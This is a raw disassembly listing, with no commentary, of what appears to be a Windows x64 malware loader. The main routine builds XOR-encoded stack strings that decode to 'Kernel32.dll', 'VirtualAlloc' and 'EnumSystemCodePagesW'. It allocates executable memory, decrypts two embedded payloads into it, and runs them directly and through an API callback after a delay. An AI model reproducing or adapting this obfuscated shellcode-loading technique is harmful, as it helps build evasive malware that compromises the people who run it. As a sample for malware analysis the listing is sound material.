  40366a:	ff 15 e8 b1 0d 00    	call   *0xdb1e8(%rip)        # 0x4de858
  403670:	48 85 c0             	test   %rax,%rax
  403673:	48 89 05 26 9e 0d 00 	mov    %rax,0xd9e26(%rip)        # 0x4dd4a0
  40367a:	0f 84 b5 05 00 00    	je     0x403c35
  403680:	44 89 ea             	mov    %r13d,%edx
  403683:	48 89 c1             	mov    %rax,%rcx
  403686:	48 8d 9c 24 20 01 00 	lea    0x120(%rsp),%rbx
  40368d:	00 
  40368e:	ff 15 74 b2 0d 00    	call   *0xdb274(%rip)        # 0x4de908
  403694:	48 8b 0d 05 9e 0d 00 	mov    0xd9e05(%rip),%rcx        # 0x4dd4a0
  40369b:	48 89 df             	mov    %rbx,%rdi
  40369e:	ff 15 74 b2 0d 00    	call   *0xdb274(%rip)        # 0x4de918
  4036a4:	48 8d 8c 24 80 00 00 	lea    0x80(%rsp),%rcx
  4036ab:	00 
  4036ac:	ff 15 f6 ae 0d 00    	call   *0xdaef6(%rip)        # 0x4de5a8
  4036b2:	0f b7 84 24 88 00 00 	movzwl 0x88(%rsp),%eax
  4036b9:	00 
  4036ba:	89 05 80 89 0d 00    	mov    %eax,0xd8980(%rip)        # 0x4dc040
  4036c0:	0f b7 84 24 8a 00 00 	movzwl 0x8a(%rsp),%eax
  4036c7:	00 
  4036c8:	89 05 6e 89 0d 00    	mov    %eax,0xd896e(%rip)        # 0x4dc03c
  4036ce:	0f b7 84 24 8c 00 00 	movzwl 0x8c(%rsp),%eax
  4036d5:	00 
  4036d6:	89 05 5c 89 0d 00    	mov    %eax,0xd895c(%rip)        # 0x4dc038
  4036dc:	0f b7 84 24 80 00 00 	movzwl 0x80(%rsp),%eax
  4036e3:	00 
  4036e4:	89 05 8a 7b 00 00    	mov    %eax,0x7b8a(%rip)        # 0x40b274
  4036ea:	0f b7 84 24 82 00 00 	movzwl 0x82(%rsp),%eax
  4036f1:	00 
  4036f2:	89 05 78 7b 00 00    	mov    %eax,0x7b78(%rip)        # 0x40b270
  4036f8:	0f b7 84 24 86 00 00 	movzwl 0x86(%rsp),%eax
  4036ff:	00 
  403700:	89 05 66 7b 00 00    	mov    %eax,0x7b66(%rip)        # 0x40b26c
  403706:	e8 b5 f5 ff ff       	call   0x402cc0
  40370b:	b9 06 00 00 00       	mov    $0x6,%ecx
  403710:	4c 89 e0             	mov    %r12,%rax
  403713:	48 8b 35 8e b1 0d 00 	mov    0xdb18e(%rip),%rsi        # 0x4de8a8
  40371a:	f3 48 ab             	rep stos %rax,(%rdi)
  40371d:	48 8b 2d ec b1 0d 00 	mov    0xdb1ec(%rip),%rbp        # 0x4de910
  403724:	48 8b 3d 45 b1 0d 00 	mov    0xdb145(%rip),%rdi        # 0x4de870
  40372b:	eb 0d                	jmp    0x40373a
  40372d:	0f 1f 00             	nopl   (%rax)
  403730:	48 89 d9             	mov    %rbx,%rcx
  403733:	ff d5                	call   *%rbp
  403735:	48 89 d9             	mov    %rbx,%rcx
  403738:	ff d7                	call   *%rdi
  40373a:	45 31 c9             	xor    %r9d,%r9d
  40373d:	45 31 c0             	xor    %r8d,%r8d
  403740:	31 d2                	xor    %edx,%edx
  403742:	48 89 d9             	mov    %rbx,%rcx
  403745:	ff d6                	call   *%rsi
  403747:	85 c0                	test   %eax,%eax
  403749:	75 e5                	jne    0x403730
  40374b:	e8 20 e5 ff ff       	call   0x401c70
  403750:	b8 01 00 00 00       	mov    $0x1,%eax
  403755:	e9 a7 04 00 00       	jmp    0x403c01
  40375a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  403760:	48 8d 9c 24 30 03 00 	lea    0x330(%rsp),%rbx
  403767:	00 
  403768:	48 8d 35 b1 78 00 00 	lea    0x78b1(%rip),%rsi        # 0x40b020
  40376f:	b9 26 00 00 00       	mov    $0x26,%ecx
  403774:	48 8d ac 24 20 02 00 	lea    0x220(%rsp),%rbp
  40377b:	00 
  40377c:	c7 84 24 a0 00 00 00 	movl   $0x4f,0xa0(%rsp)
  403783:	4f 00 00 00 
  403787:	c7 84 24 a4 00 00 00 	movl   $0x61,0xa4(%rsp)
  40378e:	61 00 00 00 
  403792:	48 89 df             	mov    %rbx,%rdi
  403795:	c7 84 24 a8 00 00 00 	movl   $0x76,0xa8(%rsp)
  40379c:	76 00 00 00 
  4037a0:	c7 84 24 ac 00 00 00 	movl   $0x6a,0xac(%rsp)
  4037a7:	6a 00 00 00 
  4037ab:	f3 48 a5             	rep movsq (%rsi),(%rdi)
  4037ae:	48 8d 35 ab 79 00 00 	lea    0x79ab(%rip),%rsi        # 0x40b160
  4037b5:	48 89 ef             	mov    %rbp,%rdi
  4037b8:	c7 84 24 b0 00 00 00 	movl   $0x61,0xb0(%rsp)
  4037bf:	61 00 00 00 
  4037c3:	c7 84 24 b4 00 00 00 	movl   $0x68,0xb4(%rsp)
  4037ca:	68 00 00 00 
  4037ce:	c7 84 24 b8 00 00 00 	movl   $0x37,0xb8(%rsp)
  4037d5:	37 00 00 00 
  4037d9:	c7 84 24 bc 00 00 00 	movl   $0x36,0xbc(%rsp)
  4037e0:	36 00 00 00 
  4037e4:	c7 84 24 c0 00 00 00 	movl   $0x2a,0xc0(%rsp)
  4037eb:	2a 00 00 00 
  4037ef:	c7 84 24 c4 00 00 00 	movl   $0x60,0xc4(%rsp)
  4037f6:	60 00 00 00 
  4037fa:	c7 84 24 c8 00 00 00 	movl   $0x68,0xc8(%rsp)
  403801:	68 00 00 00 
  403805:	c7 84 24 cc 00 00 00 	movl   $0x68,0xcc(%rsp)
  40380c:	68 00 00 00 
  403810:	c7 84 24 d0 00 00 00 	movl   $0x4,0xd0(%rsp)
  403817:	04 00 00 00 
  40381b:	b1 21                	mov    $0x21,%cl
  40381d:	c7 84 24 e0 00 00 00 	movl   $0x52,0xe0(%rsp)
  403824:	52 00 00 00 
  403828:	c7 84 24 e4 00 00 00 	movl   $0x6d,0xe4(%rsp)
  40382f:	6d 00 00 00 
  403833:	f3 48 a5             	rep movsq (%rsi),(%rdi)
  403836:	c7 84 24 e8 00 00 00 	movl   $0x76,0xe8(%rsp)
  40383d:	76 00 00 00 
  403841:	c7 84 24 ec 00 00 00 	movl   $0x70,0xec(%rsp)
  403848:	70 00 00 00 
  40384c:	c7 84 24 f0 00 00 00 	movl   $0x71,0xf0(%rsp)
  403853:	71 00 00 00 
  403857:	c7 84 24 f4 00 00 00 	movl   $0x65,0xf4(%rsp)
  40385e:	65 00 00 00 
  403862:	c7 84 24 f8 00 00 00 	movl   $0x68,0xf8(%rsp)
  403869:	68 00 00 00 
  40386d:	c7 84 24 fc 00 00 00 	movl   $0x45,0xfc(%rsp)
  403874:	45 00 00 00 
  403878:	c7 84 24 00 01 00 00 	movl   $0x68,0x100(%rsp)
  40387f:	68 00 00 00 
  403883:	c7 84 24 04 01 00 00 	movl   $0x68,0x104(%rsp)
  40388a:	68 00 00 00 
  40388e:	c7 84 24 08 01 00 00 	movl   $0x6b,0x108(%rsp)
  403895:	6b 00 00 00 
  403899:	c7 84 24 0c 01 00 00 	movl   $0x67,0x10c(%rsp)
  4038a0:	67 00 00 00 
  4038a4:	8b 06                	mov    (%rsi),%eax
  4038a6:	c7 84 24 10 01 00 00 	movl   $0x4,0x110(%rsp)
  4038ad:	04 00 00 00 
  4038b1:	31 f6                	xor    %esi,%esi
  4038b3:	c7 84 24 c0 01 00 00 	movl   $0x41,0x1c0(%rsp)
  4038ba:	41 00 00 00 
  4038be:	89 07                	mov    %eax,(%rdi)
  4038c0:	c7 84 24 c4 01 00 00 	movl   $0x6a,0x1c4(%rsp)
  4038c7:	6a 00 00 00 
  4038cb:	c7 84 24 c8 01 00 00 	movl   $0x71,0x1c8(%rsp)
  4038d2:	71 00 00 00 
  4038d6:	c7 84 24 cc 01 00 00 	movl   $0x69,0x1cc(%rsp)
  4038dd:	69 00 00 00 
  4038e1:	c7 84 24 d0 01 00 00 	movl   $0x57,0x1d0(%rsp)
  4038e8:	57 00 00 00 
  4038ec:	c7 84 24 d4 01 00 00 	movl   $0x7d,0x1d4(%rsp)
  4038f3:	7d 00 00 00 
  4038f7:	c7 84 24 d8 01 00 00 	movl   $0x77,0x1d8(%rsp)
  4038fe:	77 00 00 00 
  403902:	c7 84 24 dc 01 00 00 	movl   $0x70,0x1dc(%rsp)
  403909:	70 00 00 00 
  40390d:	c7 84 24 e0 01 00 00 	movl   $0x61,0x1e0(%rsp)
  403914:	61 00 00 00 
  403918:	c7 84 24 e4 01 00 00 	movl   $0x69,0x1e4(%rsp)
  40391f:	69 00 00 00 
  403923:	c7 84 24 e8 01 00 00 	movl   $0x47,0x1e8(%rsp)
  40392a:	47 00 00 00 
  40392e:	c7 84 24 ec 01 00 00 	movl   $0x6b,0x1ec(%rsp)
  403935:	6b 00 00 00 
  403939:	c7 84 24 f0 01 00 00 	movl   $0x60,0x1f0(%rsp)
  403940:	60 00 00 00 
  403944:	c7 84 24 f4 01 00 00 	movl   $0x61,0x1f4(%rsp)
  40394b:	61 00 00 00 
  40394f:	c7 84 24 f8 01 00 00 	movl   $0x54,0x1f8(%rsp)
  403956:	54 00 00 00 
  40395a:	c7 84 24 fc 01 00 00 	movl   $0x65,0x1fc(%rsp)
  403961:	65 00 00 00 
  403965:	c7 84 24 00 02 00 00 	movl   $0x63,0x200(%rsp)
  40396c:	63 00 00 00 
  403970:	c7 84 24 04 02 00 00 	movl   $0x61,0x204(%rsp)
  403977:	61 00 00 00 
  40397b:	c7 84 24 08 02 00 00 	movl   $0x77,0x208(%rsp)
  403982:	77 00 00 00 
  403986:	c7 84 24 0c 02 00 00 	movl   $0x53,0x20c(%rsp)
  40398d:	53 00 00 00 
  403991:	c7 84 24 10 02 00 00 	movl   $0x4,0x210(%rsp)
  403998:	04 00 00 00 
  40399c:	e8 3f dd ff ff       	call   0x4016e0
  4039a1:	b9 4f 00 00 00       	mov    $0x4f,%ecx
  4039a6:	eb 0f                	jmp    0x4039b7
  4039a8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  4039af:	00 
  4039b0:	8b 8c b4 a0 00 00 00 	mov    0xa0(%rsp,%rsi,4),%ecx
  4039b7:	ba 04 00 00 00       	mov    $0x4,%edx
  4039bc:	e8 5f dd ff ff       	call   0x401720
  4039c1:	88 44 34 60          	mov    %al,0x60(%rsp,%rsi,1)
  4039c5:	48 83 c6 01          	add    $0x1,%rsi
  4039c9:	48 83 fe 0d          	cmp    $0xd,%rsi
  4039cd:	75 e1                	jne    0x4039b0
  4039cf:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
  4039d4:	31 f6                	xor    %esi,%esi
  4039d6:	ff 15 34 ac 0d 00    	call   *0xdac34(%rip)        # 0x4de610
  4039dc:	b9 52 00 00 00       	mov    $0x52,%ecx
  4039e1:	49 89 c4             	mov    %rax,%r12
  4039e4:	eb 11                	jmp    0x4039f7
  4039e6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  4039ed:	00 00 00 
  4039f0:	8b 8c b4 e0 00 00 00 	mov    0xe0(%rsp,%rsi,4),%ecx
  4039f7:	ba 04 00 00 00       	mov    $0x4,%edx
  4039fc:	e8 1f dd ff ff       	call   0x401720
  403a01:	88 44 34 70          	mov    %al,0x70(%rsp,%rsi,1)
  403a05:	48 83 c6 01          	add    $0x1,%rsi
  403a09:	48 83 fe 0d          	cmp    $0xd,%rsi
  403a0d:	75 e1                	jne    0x4039f0
  403a0f:	4c 8d b4 24 70 01 00 	lea    0x170(%rsp),%r14
  403a16:	00 
  403a17:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
  403a1c:	4c 89 e1             	mov    %r12,%rcx
  403a1f:	4c 8b 2d a2 ab 0d 00 	mov    0xdaba2(%rip),%r13        # 0x4de5c8
  403a26:	45 31 ff             	xor    %r15d,%r15d
  403a29:	41 ff d5             	call   *%r13
  403a2c:	41 b9 40 00 00 00    	mov    $0x40,%r9d
  403a32:	48 89 c7             	mov    %rax,%rdi
  403a35:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
  403a3b:	ba 00 c6 0b 00       	mov    $0xbc600,%edx
  403a40:	31 c9                	xor    %ecx,%ecx
  403a42:	ff d0                	call   *%rax
  403a44:	41 b9 40 00 00 00    	mov    $0x40,%r9d
  403a4a:	48 89 c6             	mov    %rax,%rsi
  403a4d:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
  403a53:	ba 00 16 01 00       	mov    $0x11600,%edx
  403a58:	31 c9                	xor    %ecx,%ecx
  403a5a:	ff d7                	call   *%rdi
  403a5c:	48 89 c7             	mov    %rax,%rdi
  403a5f:	90                   	nop
  403a60:	42 8b 0c bb          	mov    (%rbx,%r15,4),%ecx
  403a64:	ba 01 00 00 00       	mov    $0x1,%edx
  403a69:	e8 b2 dc ff ff       	call   0x401720
  403a6e:	43 88 04 3e          	mov    %al,(%r14,%r15,1)
  403a72:	49 83 c7 01          	add    $0x1,%r15
  403a76:	49 83 ff 4c          	cmp    $0x4c,%r15
  403a7a:	75 e4                	jne    0x403a60
  403a7c:	48 8d 9c 24 20 01 00 	lea    0x120(%rsp),%rbx
  403a83:	00 
  403a84:	45 30 ff             	xor    %r15b,%r15b
  403a87:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  403a8e:	00 00 
  403a90:	42 8b 4c bd 00       	mov    0x0(%rbp,%r15,4),%ecx
  403a95:	ba 01 00 00 00       	mov    $0x1,%edx
  403a9a:	e8 81 dc ff ff       	call   0x401720
  403a9f:	42 88 04 3b          	mov    %al,(%rbx,%r15,1)
  403aa3:	49 83 c7 01          	add    $0x1,%r15
  403aa7:	49 83 ff 43          	cmp    $0x43,%r15
  403aab:	75 e3                	jne    0x403a90
  403aad:	48 8d 2d ec 8d 01 00 	lea    0x18dec(%rip),%rbp        # 0x41c8a0
  403ab4:	45 30 ff             	xor    %r15b,%r15b
  403ab7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  403abe:	00 00 
  403ac0:	4c 89 f1             	mov    %r14,%rcx
  403ac3:	44 8b 01             	mov    (%rcx),%r8d
  403ac6:	48 83 c1 04          	add    $0x4,%rcx
  403aca:	41 8d 90 ff fe fe fe 	lea    -0x1010101(%r8),%edx
  403ad1:	41 f7 d0             	not    %r8d
  403ad4:	44 21 c2             	and    %r8d,%edx
  403ad7:	81 e2 80 80 80 80    	and    $0x80808080,%edx
  403add:	74 e4                	je     0x403ac3
  403adf:	89 d0                	mov    %edx,%eax
  403ae1:	46 0f be 44 3d 00    	movsbl 0x0(%rbp,%r15,1),%r8d
  403ae7:	c1 e8 10             	shr    $0x10,%eax
  403aea:	f7 c2 80 80 00 00    	test   $0x8080,%edx
  403af0:	0f 44 d0             	cmove  %eax,%edx
  403af3:	48 8d 41 02          	lea    0x2(%rcx),%rax
  403af7:	48 0f 44 c8          	cmove  %rax,%rcx
  403afb:	00 d2                	add    %dl,%dl
  403afd:	4c 89 f8             	mov    %r15,%rax
  403b00:	48 83 d9 03          	sbb    $0x3,%rcx
  403b04:	31 d2                	xor    %edx,%edx
  403b06:	4c 29 f1             	sub    %r14,%rcx
  403b09:	48 f7 f1             	div    %rcx
  403b0c:	0f be 8c 14 70 01 00 	movsbl 0x170(%rsp,%rdx,1),%ecx
  403b13:	00 
  403b14:	44 89 c2             	mov    %r8d,%edx
  403b17:	e8 04 dc ff ff       	call   0x401720
  403b1c:	42 88 04 3e          	mov    %al,(%rsi,%r15,1)
  403b20:	49 83 c7 01          	add    $0x1,%r15
  403b24:	49 81 ff 00 c6 0b 00 	cmp    $0xbc600,%r15
  403b2b:	75 93                	jne    0x403ac0
  403b2d:	48 8d 2d 6c 77 00 00 	lea    0x776c(%rip),%rbp        # 0x40b2a0
  403b34:	45 31 f6             	xor    %r14d,%r14d
  403b37:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  403b3e:	00 00 
  403b40:	48 89 d9             	mov    %rbx,%rcx
  403b43:	44 8b 01             	mov    (%rcx),%r8d
  403b46:	48 83 c1 04          	add    $0x4,%rcx
  403b4a:	41 8d 90 ff fe fe fe 	lea    -0x1010101(%r8),%edx
  403b51:	41 f7 d0             	not    %r8d
  403b54:	44 21 c2             	and    %r8d,%edx
  403b57:	81 e2 80 80 80 80    	and    $0x80808080,%edx
  403b5d:	74 e4                	je     0x403b43
  403b5f:	89 d0                	mov    %edx,%eax
  403b61:	46 0f be 44 35 00    	movsbl 0x0(%rbp,%r14,1),%r8d
  403b67:	c1 e8 10             	shr    $0x10,%eax
  403b6a:	f7 c2 80 80 00 00    	test   $0x8080,%edx
  403b70:	0f 44 d0             	cmove  %eax,%edx
  403b73:	48 8d 41 02          	lea    0x2(%rcx),%rax
  403b77:	48 0f 44 c8          	cmove  %rax,%rcx
  403b7b:	00 d2                	add    %dl,%dl
  403b7d:	4c 89 f0             	mov    %r14,%rax
  403b80:	48 83 d9 03          	sbb    $0x3,%rcx
  403b84:	31 d2                	xor    %edx,%edx
  403b86:	48 29 d9             	sub    %rbx,%rcx
  403b89:	48 f7 f1             	div    %rcx
  403b8c:	0f be 8c 14 20 01 00 	movsbl 0x120(%rsp,%rdx,1),%ecx
  403b93:	00 
  403b94:	44 89 c2             	mov    %r8d,%edx
  403b97:	e8 84 db ff ff       	call   0x401720
  403b9c:	42 88 04 37          	mov    %al,(%rdi,%r14,1)
  403ba0:	49 83 c6 01          	add    $0x1,%r14
  403ba4:	49 81 fe 00 16 01 00 	cmp    $0x11600,%r14
  403bab:	75 93                	jne    0x403b40
  403bad:	ff d6                	call   *%rsi
  403baf:	31 db                	xor    %ebx,%ebx
  403bb1:	b9 70 17 00 00       	mov    $0x1770,%ecx
  403bb6:	ff 15 b4 aa 0d 00    	call   *0xdaab4(%rip)        # 0x4de670
  403bbc:	ff d7                	call   *%rdi
  403bbe:	b9 41 00 00 00       	mov    $0x41,%ecx
  403bc3:	eb 07                	jmp    0x403bcc
  403bc5:	8b 8c 9c c0 01 00 00 	mov    0x1c0(%rsp,%rbx,4),%ecx
  403bcc:	ba 04 00 00 00       	mov    $0x4,%edx
  403bd1:	e8 4a db ff ff       	call   0x401720
  403bd6:	88 84 1c 80 00 00 00 	mov    %al,0x80(%rsp,%rbx,1)
  403bdd:	48 83 c3 01          	add    $0x1,%rbx
  403be1:	48 83 fb 15          	cmp    $0x15,%rbx
  403be5:	75 de                	jne    0x403bc5
  403be7:	48 8d 94 24 80 00 00 	lea    0x80(%rsp),%rdx
  403bee:	00 
  403bef:	4c 89 e1             	mov    %r12,%rcx
  403bf2:	41 ff d5             	call   *%r13
  403bf5:	ba 01 00 00 00       	mov    $0x1,%edx
  403bfa:	48 89 f1             	mov    %rsi,%rcx
  403bfd:	ff d0                	call   *%rax
  403bff:	31 c0                	xor    %eax,%eax
  403c01:	48 81 c4 68 04 00 00 	add    $0x468,%rsp
  403c08:	5b                   	pop    %rbx
  403c09:	5e                   	pop    %rsi
  403c0a:	5f                   	pop    %rdi
  403c0b:	5d                   	pop    %rbp
  403c0c:	41 5c                	pop    %r12
  403c0e:	41 5d                	pop    %r13
  403c10:	41 5e                	pop    %r14
  403c12:	41 5f                	pop    %r15
  403c14:	c3                   	ret
  403c15:	41 b9 10 00 00 00    	mov    $0x10,%r9d
  403c1b:	4c 8d 05 e6 57 0d 00 	lea    0xd57e6(%rip),%r8        # 0x4d9408
  403c22:	48 8d 15 e4 57 0d 00 	lea    0xd57e4(%rip),%rdx        # 0x4d940d
  403c29:	31 c9                	xor    %ecx,%ecx
  403c2b:	ff 15 af ac 0d 00    	call   *0xdacaf(%rip)        # 0x4de8e0
  403c31:	31 c0                	xor    %eax,%eax
  403c33:	eb cc                	jmp    0x403c01
  403c35:	41 b9 10 00 00 00    	mov    $0x10,%r9d
  403c3b:	4c 8d 05 c6 57 0d 00 	lea    0xd57c6(%rip),%r8        # 0x4d9408
  403c42:	48 8d 15 38 58 0d 00 	lea    0xd5838(%rip),%rdx        # 0x4d9481
  403c49:	31 c9                	xor    %ecx,%ecx
  403c4b:	ff 15 8f ac 0d 00    	call   *0xdac8f(%rip)        # 0x4de8e0
  403c51:	31 c0                	xor    %eax,%eax
  403c53:	eb ac                	jmp    0x403c01
  403c55:	90                   	nop
  403c56:	90                   	nop
  403c57:	90                   	nop
  403c58:	90                   	nop
  403c59:	90                   	nop
  403c5a:	90                   	nop
  403c5b:	90                   	nop
  403c5c:	90                   	nop
  403c5d:	90                   	nop
  403c5e:	90                   	nop
  403c5f:	90                   	nop
  403c60:	ff 25 c2 ac 0d 00    	jmp    *0xdacc2(%rip)        # 0x4de928
  403c66:	90                   	nop
  403c67:	90                   	nop
  403c68:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  403c6f:	00 
  403c70:	48 83 ec 28          	sub    $0x28,%rsp
  403c74:	85 d2                	test   %edx,%edx
  403c76:	74 18                	je     0x403c90
  403c78:	83 fa 03             	cmp    $0x3,%edx
  403c7b:	74 13                	je     0x403c90
  403c7d:	b8 01 00 00 00       	mov    $0x1,%eax
  403c82:	48 83 c4 28          	add    $0x28,%rsp
  403c86:	c3                   	ret
  403c87:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  403c8e:	00 00 
  403c90:	e8 db 14 00 00       	call   0x405170
  403c95:	b8 01 00 00 00       	mov    $0x1,%eax
  403c9a:	48 83 c4 28          	add    $0x28,%rsp
  403c9e:	c3                   	ret
  403c9f:	90                   	nop
  403ca0:	56                   	push   %rsi
  403ca1:	53                   	push   %rbx
  403ca2:	48 83 ec 28          	sub    $0x28,%rsp
  403ca6:	83 3d 43 52 0d 00 02 	cmpl   $0x2,0xd5243(%rip)        # 0x4d8ef0
  403cad:	74 0a                	je     0x403cb9
  403caf:	c7 05 37 52 0d 00 02 	movl   $0x2,0xd5237(%rip)        # 0x4d8ef0
  403cb6:	00 00 00 
  403cb9:	83 fa 02             	cmp    $0x2,%edx
  403cbc:	74 12                	je     0x403cd0
  403cbe:	83 fa 01             	cmp    $0x1,%edx
  403cc1:	74 3f                	je     0x403d02
  403cc3:	b8 01 00 00 00       	mov    $0x1,%eax
  403cc8:	48 83 c4 28          	add    $0x28,%rsp
  403ccc:	5b                   	pop    %rbx
  403ccd:	5e                   	pop    %rsi
  403cce:	c3                   	ret
  403ccf:	90                   	nop
  403cd0:	48 8d 1d 89 c3 0d 00 	lea    0xdc389(%rip),%rbx        # 0x4e0060
  403cd7:	48 8d 35 82 c3 0d 00 	lea    0xdc382(%rip),%rsi        # 0x4e0060
  403cde:	48 39 f3             	cmp    %rsi,%rbx
  403ce1:	74 e0                	je     0x403cc3
  403ce3:	48 8b 03             	mov    (%rbx),%rax
  403ce6:	48 85 c0             	test   %rax,%rax
  403ce9:	74 02                	je     0x403ced
  403ceb:	ff d0                	call   *%rax
  403ced:	48 83 c3 08          	add    $0x8,%rbx
  403cf1:	48 39 f3             	cmp    %rsi,%rbx
  403cf4:	75 ed                	jne    0x403ce3
  403cf6:	b8 01 00 00 00       	mov    $0x1,%eax
  403cfb:	48 83 c4 28          	add    $0x28,%rsp
  403cff:	5b                   	pop    %rbx
  403d00:	5e                   	pop    %rsi
  403d01:	c3                   	ret
  403d02:	e8 69 14 00 00       	call   0x405170
  403d07:	eb ba                	jmp    0x403cc3
  403d09:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  403d10:	31 c0                	xor    %eax,%eax
  403d12:	c3                   	ret
  403d13:	90                   	nop
  403d14:	90                   	nop
  403d15:	90                   	nop
  403d16:	90                   	nop
  403d17:	90                   	nop
  403d18:	90                   	nop
  403d19:	90                   	nop
  403d1a:	90                   	nop
  403d1b:	90                   	nop
  403d1c:	90                   	nop
  403d1d:	90                   	nop
  403d1e:	90                   	nop
  403d1f:	90                   	nop
  403d20:	48 8b 05 b1 a9 0d 00 	mov    0xda9b1(%rip),%rax        # 0x4de6d8
  403d27:	48 ff e0             	rex.W jmp *%rax
  403d2a:	90                   	nop
  403d2b:	90                   	nop
  403d2c:	90                   	nop
  403d2d:	90                   	nop
  403d2e:	90                   	nop
  403d2f:	90                   	nop
  403d30:	48 89 c8             	mov    %rcx,%rax
  403d33:	c3                   	ret
  403d34:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
  403d3b:	00 00 00 00 00 
  403d40:	48 89 c8             	mov    %rcx,%rax
  403d43:	c3                   	ret
  403d44:	90                   	nop
  403d45:	90                   	nop
  403d46:	90                   	nop
  403d47:	90                   	nop
  403d48:	90                   	nop
  403d49:	90                   	nop
  403d4a:	90                   	nop
  403d4b:	90                   	nop
  403d4c:	90                   	nop
  403d4d:	90                   	nop
  403d4e:	90                   	nop
  403d4f:	90                   	nop
  403d50:	53                   	push   %rbx
  403d51:	48 83 ec 30          	sub    $0x30,%rsp
  403d55:	48 89 cb             	mov    %rcx,%rbx
  403d58:	48 8b 0d 49 97 0d 00 	mov    0xd9749(%rip),%rcx        # 0x4dd4a8
  403d5f:	e8 cc ff ff ff       	call   0x403d30
  403d64:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
  403d68:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  403d6d:	74 76                	je     0x403de5
  403d6f:	b9 08 00 00 00       	mov    $0x8,%ecx
  403d74:	e8 af 62 00 00       	call   0x40a028
  403d79:	48 8b 0d 28 97 0d 00 	mov    0xd9728(%rip),%rcx        # 0x4dd4a8
  403d80:	e8 ab ff ff ff       	call   0x403d30
  403d85:	48 8b 0d 24 97 0d 00 	mov    0xd9724(%rip),%rcx        # 0x4dd4b0
  403d8c:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  403d91:	e8 9a ff ff ff       	call   0x403d30
  403d96:	4c 8d 44 24 28       	lea    0x28(%rsp),%r8
  403d9b:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
  403da0:	48 89 d9             	mov    %rbx,%rcx
  403da3:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  403da8:	e8 83 62 00 00       	call   0x40a030
  403dad:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
  403db2:	48 89 c3             	mov    %rax,%rbx
  403db5:	e8 86 ff ff ff       	call   0x403d40
  403dba:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
  403dbf:	48 89 05 e2 96 0d 00 	mov    %rax,0xd96e2(%rip)        # 0x4dd4a8
  403dc6:	e8 75 ff ff ff       	call   0x403d40
  403dcb:	b9 08 00 00 00       	mov    $0x8,%ecx
  403dd0:	48 89 05 d9 96 0d 00 	mov    %rax,0xd96d9(%rip)        # 0x4dd4b0
  403dd7:	e8 5c 62 00 00       	call   0x40a038
  403ddc:	48 89 d8             	mov    %rbx,%rax
  403ddf:	48 83 c4 30          	add    $0x30,%rsp
  403de3:	5b                   	pop    %rbx
  403de4:	c3                   	ret
  403de5:	48 89 d9             	mov    %rbx,%rcx
  403de8:	ff 15 42 a9 0d 00    	call   *0xda942(%rip)        # 0x4de730
  403dee:	48 89 c3             	mov    %rax,%rbx
  403df1:	48 89 d8             	mov    %rbx,%rax
  403df4:	48 83 c4 30          	add    $0x30,%rsp
  403df8:	5b                   	pop    %rbx
  403df9:	c3                   	ret
  403dfa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  403e00:	48 83 ec 28          	sub    $0x28,%rsp
  403e04:	e8 47 ff ff ff       	call   0x403d50
  403e09:	48 83 f8 01          	cmp    $0x1,%rax
  403e0d:	19 c0                	sbb    %eax,%eax
  403e0f:	48 83 c4 28          	add    $0x28,%rsp
  403e13:	c3                   	ret
  403e14:	90                   	nop
  403e15:	90                   	nop
  403e16:	90                   	nop
  403e17:	90                   	nop
  403e18:	90                   	nop
  403e19:	90                   	nop
  403e1a:	90                   	nop
  403e1b:	90                   	nop
  403e1c:	90                   	nop
  403e1d:	90                   	nop
  403e1e:	90                   	nop
  403e1f:	90                   	nop
  403e20:	53                   	push   %rbx
  403e21:	48 83 ec 30          	sub    $0x30,%rsp
  403e25:	8b 01                	mov    (%rcx),%eax
  403e27:	3d 91 00 00 c0       	cmp    $0xc0000091,%eax
  403e2c:	77 42                	ja     0x403e70
  403e2e:	3d 8d 00 00 c0       	cmp    $0xc000008d,%eax
  403e33:	72 6b                	jb     0x403ea0
  403e35:	bb 01 00 00 00       	mov    $0x1,%ebx
  403e3a:	31 d2                	xor    %edx,%edx
  403e3c:	b9 08 00 00 00       	mov    $0x8,%ecx
  403e41:	e8 fa 61 00 00       	call   0x40a040
  403e46:	48 83 f8 01          	cmp    $0x1,%rax
  403e4a:	48 89 c2             	mov    %rax,%rdx
  403e4d:	0f 84 1d 01 00 00    	je     0x403f70
  403e53:	48 85 d2             	test   %rdx,%rdx
  403e56:	b8 01 00 00 00       	mov    $0x1,%eax
  403e5b:	74 09                	je     0x403e66
  403e5d:	b9 08 00 00 00       	mov    $0x8,%ecx
  403e62:	ff d2                	call   *%rdx
  403e64:	31 c0                	xor    %eax,%eax
  403e66:	48 83 c4 30          	add    $0x30,%rsp
  403e6a:	5b                   	pop    %rbx
  403e6b:	c3                   	ret
  403e6c:	0f 1f 40 00          	nopl   0x0(%rax)
  403e70:	3d 94 00 00 c0       	cmp    $0xc0000094,%eax
  403e75:	0f 84 b5 00 00 00    	je     0x403f30
  403e7b:	77 73                	ja     0x403ef0
  403e7d:	3d 92 00 00 c0       	cmp    $0xc0000092,%eax
  403e82:	0f 84 ca 00 00 00    	je     0x403f52
  403e88:	3d 93 00 00 c0       	cmp    $0xc0000093,%eax
  403e8d:	74 a6                	je     0x403e35
  403e8f:	b8 01 00 00 00       	mov    $0x1,%eax
  403e94:	48 83 c4 30          	add    $0x30,%rsp
